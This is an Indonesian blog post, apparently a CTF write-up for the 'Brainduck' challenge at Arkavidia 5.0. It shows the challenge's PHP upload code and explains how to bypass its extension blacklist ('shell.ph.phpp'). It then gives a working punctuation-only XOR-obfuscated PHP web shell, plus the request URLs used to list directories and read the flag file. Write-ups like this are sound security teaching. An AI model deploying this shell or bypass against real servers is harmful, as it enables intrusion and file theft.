---
author: cacadosman
date: 2019-02-10 02:46:54+00:00
draft: false
title: Writeup CTF Brainduck Final Arkavidia 5.0
type: post
url: /writeup-ctf-brainduck-final-arkavidia-5-0/
comments: true
categories:
- CTF
- Cyber Security
---

Terdapat sebuah web yang memiliki fitur untuk menginterpretasikan esolang brainfuck.

![](/wp-content/2019/02/bd.png)


Jadi kira hanya perlu mengupload file yang berisikan bahasa brainfuck untuk diinterpretasikan dan juga dapat mendownload file yang telah kita upload.

Saat kita lakukan inspect element/view source terdapat hint ?debug=V untuk dapat melihat source code php nya. Lalu kita akan mendapat source seperti berikut:
    
```php
<?php

  if (isset($_GET["debug"])) {
    highlight_file(__FILE__);
    die();
  }

  function processUpload() {
    if (!is_uploaded_file($_FILES['file']['tmp_name'])) {
      throw new Exception('Bukan file terupload');
    }

    if ($_FILES['file']['size'] > 500) {
      throw new Exception('Ukuran file tidak boleh melebihi 500 bytes');
    }

    // harusnya cuma boleh ><+-[].,
    // tapi ya sudah lah ¯\_(ツ)_/¯
    $content = file_get_contents($_FILES['file']['tmp_name']);
    if (!ctype_punct(preg_replace('/\s+/', '', $content))) {
      throw new Exception('Isi file hanya boleh ada karakter tanda baca dan whitespace');
    }

    $name = $_FILES['file']['name'];
    $name = substr($name, 0, 50);
    $name = preg_replace('/[^a-zA-Z0-9_\.]/', '', $name);

    // bibit unggul dilarang ngehack
    $blacklist = array('.php', '.php3', '.php4', '.php5', '.php7');
    $name = str_ireplace($blacklist, '', $name);

    $rand = bin2hex(random_bytes(20));
    $file = "uploads/$rand-$name";
    if (!move_uploaded_file($_FILES['file']['tmp_name'], $file)) {
      throw new Exception('Gagal upload file');
    }
    return $file;
  }

  $file = null;
  $output = null;
  $error = null;

  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // https://github.com/dotzero/brainfuck-php/blob/master/src/Brainfuck.php
    require 'brainduck.php';
    try {
      $file = processUpload();
      $brainduck = new Brainduck(file_get_contents($file), 'Brainduck', true);
      $output = $brainduck->run(true);
    } catch (Exception $e) {
      $error = $e->getMessage();
    }
  }
?>
<!-- /?debug=V -->
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <title>Brainduck</title>

    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  </head>

  <body>
    <div class="container-fluid">

<?php if($error): ?>
      <div class="alert alert-danger">
        <?php echo htmlspecialchars($error); ?>
      </div>
<?php elseif($file): ?>
      <div class="alert alert-success">
        File sukses terupload. <a href="<?php echo htmlspecialchars($file); ?>">Download</a>
      </div>
<?php endif; ?>

<?php if($output !== null): ?>
<?php if($output === ""): ?>
        <div class="card-header alert alert-danger">
          Tidak ada output atau terjadi error
        </div>
<?php else: ?>
      <div class="card mb-3">
        <div class="card-header alert alert-success">
          Output
        </div>
        <div class="card-body">
          <code><?php echo htmlspecialchars($output); ?></code>
        </div>
      </div>
<?php endif; ?>
<?php endif; ?>

      <div class="card mb-3">
        <div class="card-header">
          Upload file Brainduck
        </div>
        <div class="card-body">
          Contoh:
          <ul>
            <li><a href="examples/hello_world.bf">Hello World!</a></li>
            <li><a href="examples/squares.bf">Bilangan Kuadrat</a></li>
          </ul>
          <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <button type="submit" class="btn btn-primary">Upload</button>
          </form>
        </div>
      </div>
    </div>
  </body>
</html>
```

Sebenarnya tak ada hubungannya dengan brainfuck, jika kita melihat source diatas, kita dapat menyimpulkan bahwa vuln terdapat dibagian Upload File.

Loh kok upload file?
1. Karena bisa didownload/diakses
2. Filter ekstensi hanya str_ireplace yang bisa diakali
3. Tetap dapat menginputkan punctuation characters (tidak hanya + - > < . ,)

Bagaimana cara mengakali str_ireplace?
Dengan cara merubah ekstensi menjadi namafile.ph.phpp, sehingga akan menjadi namafile.php karena .php akan difilter/dihilangkan

Lalu bagaimana kita memasukkan shell yang hanya punctuation character saja ?
Dengan cara menggunakan XOR pada PHP, karena pada bahasa pemrograman PHP kita bisa melakukan String XOR.

Kita akan melakukan XOR string "**`{{{**" dengan string "**?<>/**" yang dimana empat karakter tersebut jika diXOR akan menghasilkan _GET

Lalu kita tinggal merangkainya menjadi sebuah shell:


```php
<?=$_="`{{{"^"?<>/";${$_}[_](${$_}[__](${$_}[___]));
```


lalu simpan dengan nama shell.ph.phpp dan langsung saja kita upload.

Akhirnya kita bisa melakukan akses shell dengan mengakses alamat berikut:

<blockquote>http://3.1.8.39:10002/uploads/blablabla123-shell.php?_=print_r&__=scandir&___=..</blockquote>


(untuk melakukan listing directory, dengan catatan passthru, shell_exec, dan exec ternyata didisable)


Setelah mengetahui flag terdapat pada ../flag.php maka langsung saja kita akses.


<blockquote>http://3.1.8.39:10002/blablabla123-shell.php?_=print_r&__=file_get_contents&___=../flag.php</blockquote>


Maka kita akan mendapatkan flagnya, terima kasih :)

![](/wp-content/2019/02/DxNXdIMUcAApNV0.jpg)

